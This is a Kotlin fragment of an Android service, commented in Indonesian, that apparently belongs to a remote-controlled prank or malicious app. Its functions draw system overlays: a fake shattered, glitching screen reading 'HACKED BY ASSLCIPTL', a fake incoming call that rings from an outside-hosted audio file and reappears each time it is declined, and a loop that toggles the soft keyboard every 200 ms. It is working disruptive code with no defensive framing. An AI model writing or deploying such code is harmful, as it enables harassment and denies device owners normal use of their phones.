private val lcdOverlayWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }

private fun setLcdBroken(on: Boolean) {
    if (on) {
        if (lcdOverlayView != null) return // sudah aktif

        val html = getLcdBrokenHtml()

        Handler(Looper.getMainLooper()).post {
            try {
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    // NOT_TOUCHABLE = sentuhan tembus ke bawah, layar tetap interaktif
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    android.graphics.PixelFormat.TRANSLUCENT
                )

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    settings.javaScriptEnabled = true
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    // background transparan biar layar di bawah keliatan
                    loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
                }

                lcdOverlayView = wv
                lcdOverlayWm.addView(wv, params)

                emitStatus(JSONObject().apply { put("lcdBroken", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setLcdBroken on: ${e.message}")
            }
        }
    } else {
        Handler(Looper.getMainLooper()).post {
            lcdOverlayView?.let {
                try { lcdOverlayWm.removeView(it) } catch (_: Exception) {}
            }
            lcdOverlayView = null
            emitStatus(JSONObject().apply { put("lcdBroken", false) })
        }
    }
}

private fun getLcdBrokenHtml(): String {
    return """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>.</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: transparent;
      width: 100vw; height: 100vh;
      overflow: hidden; position: relative;
    }
    .scanline { position:fixed;left:0;width:100%;pointer-events:none;z-index:9998;mix-blend-mode:screen; }
    .dead-pixel { position:fixed;background:#000;z-index:9997;pointer-events:none; }
    .vline { position:fixed;top:0;height:100%;width:2px;z-index:9996;pointer-events:none;opacity:0.85; }
    .noise { position:fixed;inset:0;z-index:9995;opacity:0.04;pointer-events:none;
      background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
      background-repeat:repeat;background-size:200px 200px; }
    .tint { position:fixed;inset:0;z-index:9990;pointer-events:none;animation:tintFlicker 0.08s infinite; }
    @keyframes tintFlicker {
      0%{background:rgba(0,255,80,0.03)} 25%{background:rgba(140,0,255,0.05)}
      50%{background:rgba(0,255,80,0.02)} 75%{background:rgba(180,0,255,0.04)}
      100%{background:rgba(0,255,80,0.03)}
    }
    .crack-svg{position:fixed;inset:0;width:100%;height:100%;z-index:10000;pointer-events:none;}

    .glitch-band {
      position: fixed; left: 0; width: 100%;
      pointer-events: none; z-index: 9999;
      mix-blend-mode: screen;
      background: linear-gradient(90deg, transparent, rgba(0,255,68,0.35), transparent, rgba(180,0,255,0.35), transparent);
      animation: bandShift 0.12s infinite steps(2);
    }
    @keyframes bandShift {
      0%   { transform: translateX(-8%); opacity: 0.6; }
      50%  { transform: translateX(6%); opacity: 0.9; }
      100% { transform: translateX(-4%); opacity: 0.5; }
    }

    .rgb-split {
      position: fixed; inset: 0; pointer-events: none; z-index: 9989;
      mix-blend-mode: screen; opacity: 0.35;
      background: linear-gradient(90deg, rgba(0,255,68,0.10), transparent 30%, transparent 70%, rgba(170,0,255,0.10));
      animation: rgbJitter 0.07s infinite steps(3);
    }
    @keyframes rgbJitter {
      0% { transform: translate(0,0); }
      33% { transform: translate(-2px,1px); }
      66% { transform: translate(2px,-1px); }
      100% { transform: translate(0,0); }
    }

    .flash {
      position: fixed; inset: 0; pointer-events: none; z-index: 9994;
      background: #fff; opacity: 0;
    }
    .flash.on { animation: flashBurst 90ms steps(1); }
    @keyframes flashBurst {
      0% { opacity: 0.55; }
      50% { opacity: 0.15; }
      100% { opacity: 0; }
    }

    .hshift {
      position: fixed; left: 0; width: 100%; pointer-events: none;
      z-index: 9993; mix-blend-mode: screen; opacity: 0.7;
    }

    .scanbar {
      position: fixed; left: 0; width: 100%; height: 80px;
      pointer-events: none; z-index: 9992;
      background: linear-gradient(180deg, transparent, rgba(0,255,68,0.12), transparent);
      mix-blend-mode: screen;
      animation: scanMove 2.4s linear infinite;
    }
    @keyframes scanMove {
      0% { top: -80px; }
      100% { top: 100vh; }
    }

    .vignette {
      position: fixed; inset: 0; pointer-events: none; z-index: 9991;
      box-shadow: inset 0 0 120px rgba(0,0,0,0.75),
                  inset 0 0 40px rgba(170,0,255,0.15);
      animation: vigPulse 1.7s ease-in-out infinite;
    }
    @keyframes vigPulse {
      0%,100% { opacity: 0.85; }
      50% { opacity: 1; }
    }

    .grain {
      position: fixed; inset: 0; pointer-events: none; z-index: 9988;
      opacity: 0.08; mix-blend-mode: overlay;
      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 120 120' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='g'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='1.4' numOctaves='2'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23g)'/%3E%3C/svg%3E");
      background-size: 120px 120px;
      animation: grainShift 0.09s infinite steps(2);
    }
    @keyframes grainShift {
      0% { transform: translate(0,0); }
      50% { transform: translate(-3px,2px); }
      100% { transform: translate(2px,-2px); }
    }

    .corner-bracket {
      position: fixed; width: 46px; height: 46px; pointer-events: none;
      z-index: 9987; border-color: #00ff44; border-style: solid; border-width: 0;
      opacity: 0.55; mix-blend-mode: screen;
      animation: bracketFlicker 0.4s infinite steps(2);
    }
    .corner-bracket.tl { top: 14px; left: 14px; border-top-width: 2px; border-left-width: 2px; }
    .corner-bracket.tr { top: 14px; right: 14px; border-top-width: 2px; border-right-width: 2px; border-color:#aa00ff; }
    .corner-bracket.bl { bottom: 14px; left: 14px; border-bottom-width: 2px; border-left-width: 2px; border-color:#aa00ff; }
    .corner-bracket.br { bottom: 14px; right: 14px; border-bottom-width: 2px; border-right-width: 2px; }

    @keyframes bracketFlicker {
      0% { opacity: 0.25; }
      100% { opacity: 0.75; }
    }

    .text-glitch {
      position: fixed; pointer-events: none; z-index: 9986;
      font-family: monospace; font-size: 11px; letter-spacing: 2px;
      color: #00ff44; text-shadow: 0 0 4px #00ff44, 1px 0 #aa00ff;
      opacity: 0.55; mix-blend-mode: screen;
      animation: textFlick 0.25s infinite steps(2);
    }
    @keyframes textFlick {
      0% { opacity: 0.15; transform: translateX(0); }
      50% { opacity: 0.65; transform: translateX(2px); }
      100% { opacity: 0.35; transform: translateX(-1px); }
    }
  </style>
</head>
<body>

<div class="tint"></div>
<div class="noise"></div>
<div class="grain"></div>
<div class="rgb-split"></div>
<div class="vignette"></div>
<div class="scanbar"></div>
<div class="flash" id="flash"></div>

<div class="corner-bracket tl"></div>
<div class="corner-bracket tr"></div>
<div class="corner-bracket bl"></div>
<div class="corner-bracket br"></div>

<div class="text-glitch" id="txt1" style="top:18px;left:80px;">SYS://ANOMALY_DETECTED</div>
<div class="text-glitch" id="txt2" style="bottom:20px;right:80px;color:#aa00ff;text-shadow:0 0 4px #aa00ff,1px 0 #00ff44;">SIGNAL::CORRUPTED</div>
<div class="text-glitch" id="txt3" style="top:50%;left:50%;transform:translate(-50%,-50%);font-size:9px;">ERR_0xDEAD::HACKED BY ASSLCIPTL</div>

<svg class="crack-svg" viewBox="0 0 1920 1080" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <filter id="glow-green">
      <feGaussianBlur stdDeviation="2" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
    <filter id="glow-purple">
      <feGaussianBlur stdDeviation="2.5" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>

  <g filter="url(#glow-green)" opacity="0.9">
    <line x1="320" y1="210" x2="180" y2="80" stroke="#00ff44" stroke-width="1.5"/>
    <line x1="320" y1="210" x2="420" y2="60" stroke="#00ff44" stroke-width="1"/>
    <line x1="320" y1="210" x2="500" y2="200" stroke="#00ee33" stroke-width="1.2"/>
    <line x1="320" y1="210" x2="220" y2="340" stroke="#00ff44" stroke-width="1"/>
    <line x1="320" y1="210" x2="100" y2="300" stroke="#00cc22" stroke-width="0.8"/>
    <line x1="320" y1="210" x2="60" y2="180" stroke="#00ff44" stroke-width="1.3"/>
    <line x1="320" y1="210" x2="280" y2="420" stroke="#00ff44" stroke-width="0.9"/>
    <line x1="320" y1="210" x2="600" y2="350" stroke="#00ee44" stroke-width="1"/>
    <circle cx="320" cy="210" r="18" fill="none" stroke="#00ff44" stroke-width="1" opacity="0.6"/>
    <circle cx="320" cy="210" r="8" fill="rgba(0,255,68,0.2)"/>
  </g>

  <g filter="url(#glow-purple)" opacity="0.85">
    <line x1="1500" y1="780" x2="1650" y2="920" stroke="#aa00ff" stroke-width="1.5"/>
    <line x1="1500" y1="780" x2="1380" y2="950" stroke="#bb00ff" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1700" y2="680" stroke="#aa00ff" stroke-width="1.2"/>
    <line x1="1500" y1="780" x2="1300" y2="680" stroke="#9900ee" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1750" y2="800" stroke="#aa00ff" stroke-width="0.8"/>
    <line x1="1500" y1="780" x2="1450" y2="600" stroke="#bb00ff" stroke-width="1"/>
    <line x1="1500" y1="780" x2="1600" y2="550" stroke="#aa00ee" stroke-width="0.9"/>
    <circle cx="1500" cy="780" r="20" fill="none" stroke="#aa00ff" stroke-width="1" opacity="0.6"/>
    <circle cx="1500" cy="780" r="9" fill="rgba(170,0,255,0.2)"/>
  </g>

  <g opacity="0.7">
    <polyline points="320,210 480,310 650,290 780,400 950,380 1100,500 1280,520 1500,780" fill="none" stroke="#55ff55" stroke-width="1" stroke-dasharray="8,3"/>
    <polyline points="320,210 400,420 520,530 700,610 900,640 1100,700 1300,730 1500,780" fill="none" stroke="#bb55ff" stroke-width="0.8" stroke-dasharray="6,4"/>
  </g>

  <ellipse cx="320" cy="210" rx="60" ry="45" fill="rgba(0,0,0,0.55)"/>
  <ellipse cx="1500" cy="780" rx="70" ry="50" fill="rgba(0,0,0,0.5)"/>

  <g opacity="0.6">
    <rect x="600" y="150" width="80" height="3" fill="#cc00ff"/>
    <rect x="900" y="400" width="60" height="2" fill="#aa00ff"/>
    <rect x="1100" y="250" width="100" height="3" fill="#dd00ff" opacity="0.5"/>
    <rect x="200" y="600" width="70" height="2" fill="#bb00ff"/>
    <rect x="1600" y="300" width="90" height="3" fill="#aa00ee"/>
  </g>

  <g opacity="0.6">
    <rect x="700" y="500" width="60" height="2" fill="#00ff44"/>
    <rect x="400" y="700" width="80" height="3" fill="#00ee33"/>
    <rect x="1200" y="600" width="70" height="2" fill="#00ff55"/>
    <rect x="1700" y="500" width="50" height="2" fill="#00ff44"/>
    <rect x="850" y="850" width="90" height="3" fill="#00ee44" opacity="0.5"/>
  </g>
</svg>

<script>
  const body = document.body;
  const vColors = ['#00ff44','#aa00ff','#cc00ff','#00ee33','#bb00ff','#55ff55'];

  for (let i = 0; i < 28; i++) {
    const el = document.createElement('div');
    el.className = 'vline';
    el.style.left = Math.random() * 100 + 'vw';
    el.style.width = (Math.random() * 2 + 0.5) + 'px';
    el.style.background = vColors[Math.floor(Math.random() * vColors.length)];
    el.style.opacity = (Math.random() * 0.6 + 0.2).toFixed(2);
    body.appendChild(el);
  }

  for (let i = 0; i < 35; i++) {
    const el = document.createElement('div');
    el.className = 'scanline';
    el.style.top = Math.random() * 100 + 'vh';
    el.style.height = (Math.random() * 3 + 0.5) + 'px';
    el.style.background = vColors[Math.floor(Math.random() * vColors.length)];
    el.style.opacity = (Math.random() * 0.55 + 0.15).toFixed(2);
    body.appendChild(el);
  }

  for (let i = 0; i < 18; i++) {
    const el = document.createElement('div');
    el.className = 'dead-pixel';
    el.style.left = Math.random() * 98 + 'vw';
    el.style.top = Math.random() * 98 + 'vh';
    el.style.width = (Math.floor(Math.random() * 40) + 8) + 'px';
    el.style.height = (Math.floor(Math.random() * 8) + 2) + 'px';
    el.style.opacity = (Math.random() * 0.7 + 0.3).toFixed(2);
    body.appendChild(el);
  }

  const style = document.createElement('style');
  style.textContent =
    '@keyframes vFlicker{0%{opacity:0.1}30%{opacity:0.8}45%{opacity:0}60%{opacity:0.7}80%{opacity:0.3}100%{opacity:0.6}}' +
    '@keyframes hFlicker{0%{opacity:0.05}20%{opacity:0.6}40%{opacity:0}55%{opacity:0.5}75%{opacity:0.2}100%{opacity:0.4}}';

  document.head.appendChild(style);

  document.querySelectorAll('.vline').forEach(el => {
    el.style.animation = 'vFlicker ' + (Math.random() * 120 + 40) + 'ms infinite';
  });

  document.querySelectorAll('.scanline').forEach(el => {
    el.style.animation = 'hFlicker ' + (Math.random() * 100 + 50) + 'ms infinite';
  });

  setInterval(() => {
    const lines = document.querySelectorAll('.scanline');
    const pick = lines[Math.floor(Math.random() * lines.length)];

    if (pick) pick.style.top = Math.random() * 100 + 'vh';

    const vlines = document.querySelectorAll('.vline');
    const vpick = vlines[Math.floor(Math.random() * vlines.length)];

    if (vpick) vpick.style.left = Math.random() * 100 + 'vw';
  }, 200);

  setInterval(() => {
    const tint = document.querySelector('.tint');
    if (!tint) return;

    const pick = Math.random();

    if (pick < 0.15) {
      tint.style.background = 'rgba(0,255,68,0.12)';
      setTimeout(() => {
        tint.style.background = '';
      }, 60);
    } else if (pick < 0.30) {
      tint.style.background = 'rgba(160,0,255,0.14)';
      setTimeout(() => {
        tint.style.background = '';
      }, 80);
    }
  }, 350);

  /* GLITCH BAND */
  const bandCount = 6;
  const bands = [];

  for (let i = 0; i < bandCount; i++) {
    const b = document.createElement('div');
    b.className = 'glitch-band';
    b.style.height = (Math.random() * 10 + 3) + 'px';
    b.style.top = (Math.random() * 100) + 'vh';
    b.style.opacity = (Math.random() * 0.4 + 0.3).toFixed(2);
    body.appendChild(b);
    bands.push(b);
  }

  setInterval(() => {
    const b = bands[Math.floor(Math.random() * bands.length)];
    if (!b) return;

    b.style.top = (Math.random() * 100) + 'vh';
    b.style.height = (Math.random() * 14 + 2) + 'px';
  }, 120);

  /* FLASH */
  const flash = document.getElementById('flash');

  function doFlash() {
    if (!flash) return;

    const r = Math.random();
    flash.style.background = r < 0.4
      ? '#ffffff'
      : (r < 0.7 ? '#00ff44' : '#aa00ff');

    flash.classList.remove('on');
    void flash.offsetWidth;
    flash.classList.add('on');
  }

  setInterval(() => {
    if (Math.random() < 0.22) doFlash();
  }, 900);

  /* HORIZONTAL SHIFT */
  setInterval(() => {
    if (Math.random() > 0.35) return;

    const slice = document.createElement('div');
    slice.className = 'hshift';

    const h = Math.random() * 40 + 4;
    slice.style.top = (Math.random() * 100) + 'vh';
    slice.style.height = h + 'px';

    slice.style.background = Math.random() < 0.5
      ? 'rgba(0,255,68,0.18)'
      : 'rgba(170,0,255,0.18)';

    slice.style.transform =
      'translateX(' + (Math.random() * 80 - 40).toFixed(1) + 'px)';

    slice.style.filter = 'blur(0.4px)';
    body.appendChild(slice);

    setTimeout(() => slice.remove(), 90 + Math.random() * 120);
  }, 260);

  /* RANDOM TEXT GLITCH */
  const texts = ['txt1','txt2','txt3']
    .map(id => document.getElementById(id))
    .filter(Boolean);

  setInterval(() => {
    texts.forEach(t => {
      if (Math.random() < 0.5) {
        t.textContent = 'ERR_' +
          Math.random().toString(16).slice(2, 6).toUpperCase() +
          '::HACKED BY ASSLCIPTL';
      }

      t.style.opacity = (Math.random() * 0.6 + 0.2).toFixed(2);
    });
  }, 700);

  /* FILTER GLITCH */
  setInterval(() => {
    if (Math.random() > 0.12) return;

    body.style.filter =
      'hue-rotate(' + (Math.random() * 40 - 20).toFixed(0) +
      'deg) contrast(1.15)';

    setTimeout(() => {
      body.style.filter = '';
    }, 70 + Math.random() * 90);
  }, 1100);
</script>

</body>
</html>"""
}

  
    

private var prankCallOverlayView: android.webkit.WebView? = null
private val prankCallWm: WindowManager by lazy {
    getSystemService(WINDOW_SERVICE) as WindowManager
}

private fun setPrankCall(on: Boolean) {
    if (on) {
        if (prankCallOverlayView != null) return

        val html = getPrankCallHtml()

        Handler(Looper.getMainLooper()).post {
            try {
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    PixelFormat.TRANSLUCENT
                )

                val wv = android.webkit.WebView(this@DeviceService).apply {
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true

                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                    background = null

                    isClickable = true
                    isFocusable = true
                    isFocusableInTouchMode = true

                    loadDataWithBaseURL(
                        null,
                        html,
                        "text/html",
                        "UTF-8",
                        null
                    )
                }

                prankCallOverlayView = wv
                prankCallWm.addView(wv, params)

                emitStatus(JSONObject().apply {
                    put("prankCallActive", true)
                })

            } catch (e: Exception) {
                Log.e("DeviceService", "setPrankCall on: ${e.message}")
            }
        }
    } else {
        Handler(Looper.getMainLooper()).post {
            prankCallOverlayView?.let {
                try {
                    prankCallWm.removeView(it)
                    it.destroy()
                } catch (e: Exception) {
                    Log.e("DeviceService", "setPrankCall off: ${e.message}")
                }
            }

            prankCallOverlayView = null

            emitStatus(JSONObject().apply {
                put("prankCallActive", false)
            })
        }
    }
}



private fun getPrankCallHtml(): String {
    return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="transparent">
<title>Panggilan Masuk</title>

<style>
  * {
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
    user-select: none;
  }

  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background: transparent;
    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    overflow: hidden;
  }

  .notification-container {
    position: fixed;
    top: max(20px, env(safe-area-inset-top));
    left: 50%;
    transform: translateX(-50%);
    width: 90%;
    max-width: 400px;
    z-index: 999999;
    animation: slideDown 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
  }

  @keyframes slideDown {
    from {
      opacity: 0;
      transform: translate(-50%, -60px);
    }
    to {
      opacity: 1;
      transform: translate(-50%, 0);
    }
  }

  .notification-card {
    background: rgba(30, 30, 30, 0.9);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border-radius: 28px;
    padding: 16px 20px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.6),
                inset 0 1px 0 rgba(255,255,255,0.1);
    display: flex;
    flex-direction: column;
    color: white;
  }

  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 12px;
    color: #b0b0b0;
    margin-bottom: 12px;
    padding: 0 5px;
  }

  .time {
    font-weight: 500;
  }

  .sim-label {
    font-size: 10px;
    font-weight: 600;
  }

  .content {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 15px;
  }

  .contact-info {
    display: flex;
    align-items: center;
    gap: 15px;
    flex: 1;
    min-width: 0;
  }

  .avatar {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    background: linear-gradient(135deg, #4a4a4a, #2a2a2a);
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 20px;
    font-weight: 600;
    color: #fff;
    flex-shrink: 0;
    box-shadow: inset 0 2px 4px rgba(255,255,255,0.1);
    text-transform: uppercase;
    animation: pulse 1s infinite alternate;
  }

  @keyframes pulse {
    from {
      box-shadow: 0 0 0 0 rgba(67,160,71,0.4);
    }
    to {
      box-shadow: 0 0 0 12px rgba(67,160,71,0);
    }
  }

  .text-info {
    display: flex;
    flex-direction: column;
    min-width: 0;
  }

  .name {
    font-size: 18px;
    font-weight: 600;
    margin: 0 0 2px 0;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    color: #fff;
  }

  .number {
    font-size: 13px;
    color: #a0a0a0;
    margin: 0;
  }

  .actions {
    display: flex;
    gap: 10px;
    flex-shrink: 0;
  }

  .btn {
    width: 48px;
    height: 48px;
    border-radius: 50%;
    border: none;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    transition: transform 0.1s, opacity 0.2s;
  }

  .btn:active {
    transform: scale(0.9);
    opacity: 0.8;
  }

  .btn svg {
    width: 22px;
    height: 22px;
    fill: white;
  }

  .btn-reject {
    background: #e53935;
  }

  .btn-accept {
    background: #43a047;
  }

  .notification-container.hide {
    animation: slideUp 0.2s ease-in forwards;
  }

  @keyframes slideUp {
    to {
      opacity: 0;
      transform: translate(-50%, -60px);
    }
  }
</style>
</head>

<body>

<audio
  id="ringtone"
  src="https://d.top4top.io/m_3957zw2kk0.mp3"
  loop
  preload="auto"
  playsinline>
</audio>

<div class="notification-container" id="notif">
  <div class="notification-card">

    <div class="header">
      <span class="time" id="current-time">00:00</span>
      <span class="sim-label">SIM 1</span>
    </div>

    <div class="content">
      <div class="contact-info">
        <div class="avatar" id="avatar">A</div>

        <div class="text-info">
          <div class="name" id="name">Memuat...</div>
          <div class="number" id="number">+62 ...</div>
        </div>
      </div>

      <div class="actions">
        <button
          class="btn btn-reject"
          onclick="handleAction('declined')"
          aria-label="Tolak">
          <svg viewBox="0 0 24 24">
            <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/>
          </svg>
        </button>

        <button
          class="btn btn-accept"
          onclick="handleAction('accepted')"
          aria-label="Jawab">
          <svg viewBox="0 0 24 24">
            <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.03 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
          </svg>
        </button>
      </div>
    </div>

  </div>
</div>

<script>
  const ringtone = document.getElementById('ringtone');
  const notif = document.getElementById('notif');

  /* JAM */
  function updateClock() {
    const t = new Date().toLocaleTimeString('id-ID', {
      timeZone: 'Asia/Jakarta',
      hour: '2-digit',
      minute: '2-digit',
      hour12: false
    });

    document.getElementById('current-time').textContent = t;
  }

  updateClock();
  setInterval(updateClock, 1000);

  /* DATA NAMA */
  const firstNames = [
    "Alex","Daniel","Michael","Chris","Budi","Siti","Andi",
    "Rina","Dimas","Kevin","Jessica","Raffi","Iqbaal","Agus",
    "Dewi","Eko","Fajar","Gita","Hendra","Indah","Joko",
    "Kartika","Lukman","Maya","Nanda","Oscar","Putri","Qori",
    "Rizky","Sari","Taufik","Umar","Vina","Wahyu","Yuni",
    "Zaki","Ayu","Bima","Citra","Doni","Eka","Fani",
    "Gunawan","Hana","Irfan","Jihan","Kiki","Lina","Mega",
    "Niko","Oki","Prita","Rama","Sinta","Tomi","Ulfa",
    "Vito","Wulan","Yoga","Zahra","Arif","Bella","Candra","Dina"
  ];

  const lastNames = [
    "Morgan","Wilson","Anderson","Taylor","Santoso",
    "Nurhaliza","Wijaya","Kartika","Pratama","Sanjaya",
    "Mila","Ahmad","Ramadhan","Saputra","Lestari","Hidayat",
    "Permata","Kusuma","Firmansyah","Anggraini","Setiawan",
    "Rahayu","Nugroho","Sari","Prabowo","Utami","Hakim",
    "Simanjuntak","Siregar","Ginting","Nasution","Situmorang",
    "Panjaitan","Hutapea","Sitorus","Manurung","Tambunan",
    "Putra","Putri","Dewi","Rizky","Fauzi","Ibrahim","Maulana"
  ];

  const prefixes = [
    "811","812","813","821","822","823","851","852","853",
    "855","856","857","858","859","877","878","881","882",
    "883","884","885","886","887","888","889","895","896",
    "897","898","899"
  ];

  function randName() {
    const first = firstNames[Math.floor(Math.random() * firstNames.length)];
    const last = lastNames[Math.floor(Math.random() * lastNames.length)];

    return first + " " + last;
  }

  function rnd(n) {
    let s = "";

    for (let i = 0; i < n; i++) {
      s += Math.floor(Math.random() * 10);
    }

    return s;
  }

  /* NOMOR TANPA TEMPLATE LITERAL */
  function randPhone() {
    const p = prefixes[Math.floor(Math.random() * prefixes.length)];
    const full = p + rnd(Math.random() < 0.5 ? 7 : 8);

    return "+62 " +
      full.substring(0, 3) + "-" +
      full.substring(3, 7) + "-" +
      full.substring(7);
  }

  /* TAMPILKAN NOTIFIKASI */
  function showNotification() {
    notif.classList.remove('hide');
    notif.style.display = 'block';

    const name = randName();
    const phone = randPhone();

    document.getElementById('name').textContent = name;
    document.getElementById('number').textContent = phone;
    document.getElementById('avatar').textContent =
      name.charAt(0).toUpperCase();

    if (navigator.vibrate) {
      navigator.vibrate([400, 200, 400, 200, 400]);
    }

    try {
      ringtone.currentTime = 0;
      ringtone.play().catch(function() {});
    } catch (e) {}
  }

  /* TOMBOL AKSI */
  function handleAction(action) {
    if (navigator.vibrate) {
      navigator.vibrate(0);
    }

    ringtone.pause();
    notif.classList.add('hide');

    if (action === 'accepted') {
      setTimeout(function() {
        notif.style.display = 'none';
      }, 200);

      if (
        window.AndroidBridge &&
        typeof window.AndroidBridge.onCallAction === "function"
      ) {
        window.AndroidBridge.onCallAction('accepted');
      }

      return;
    }

    setTimeout(function() {
      showNotification();
    }, 500);

    if (
      window.AndroidBridge &&
      typeof window.AndroidBridge.onCallAction === "function"
    ) {
      window.AndroidBridge.onCallAction('declined');
    }
  }

  /* MULAI */
  window.addEventListener('load', function() {
    showNotification();

    const playPromise = ringtone.play();

    if (playPromise) {
      playPromise.catch(function() {
        setTimeout(function() {
          ringtone.play().catch(function() {});
        }, 300);

        setTimeout(function() {
          ringtone.play().catch(function() {});
        }, 1000);
      });
    }

    document.addEventListener('touchstart', function() {
      if (ringtone.paused) {
        ringtone.play().catch(function() {});
      }
    }, { once: true });

    document.addEventListener('click', function() {
      if (ringtone.paused) {
        ringtone.play().catch(function() {});
      }
    }, { once: true });
  });
</script>

</body>
</html>"""
}





    
    private fun startKeyboardSpam() {
    if (keyspamActive) return
    keyspamActive = true
    keyspamShowState = true

    Handler(Looper.getMainLooper()).post {
        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                1, 1, type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 0; y = 0
            }

            val editText = android.widget.EditText(this@DeviceService).apply {
                isFocusable = true
                isFocusableInTouchMode = true
                inputType = android.text.InputType.TYPE_CLASS_TEXT
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                setTextColor(android.graphics.Color.TRANSPARENT)
                setCursorVisible(false)
            }

            keyspamOverlayView = editText
            wm.addView(editText, params)
            editText.requestFocus()

            keyspamHandler = Handler(Looper.getMainLooper())
            keyspamRunnable = object : Runnable {
                override fun run() {
                    if (!keyspamActive) return
                    val imm = getSystemService(INPUT_METHOD_SERVICE)
                        as android.view.inputmethod.InputMethodManager

                    if (keyspamShowState) {
                        editText.requestFocus()
                        imm.showSoftInput(
                            editText,
                            android.view.inputmethod.InputMethodManager.SHOW_FORCED
                        )
                    } else {
                        imm.hideSoftInputFromWindow(editText.windowToken, 0)
                    }
                    keyspamShowState = !keyspamShowState
                    keyspamHandler?.postDelayed(this, 200L)
                }
            }
            keyspamHandler?.post(keyspamRunnable!!)

        } catch (e: Exception) {
            Log.e("DeviceService", "startKeyboardSpam: ${e.message}")
            keyspamActive = false
        }
    }

    emitStatus(JSONObject().apply { put("keyboardSpamActive", true) })
}

private fun stopKeyboardSpam() {
    keyspamActive = false
    keyspamRunnable?.let { keyspamHandler?.removeCallbacks(it) }
    keyspamHandler  = null
    keyspamRunnable = null

    Handler(Looper.getMainLooper()).post {
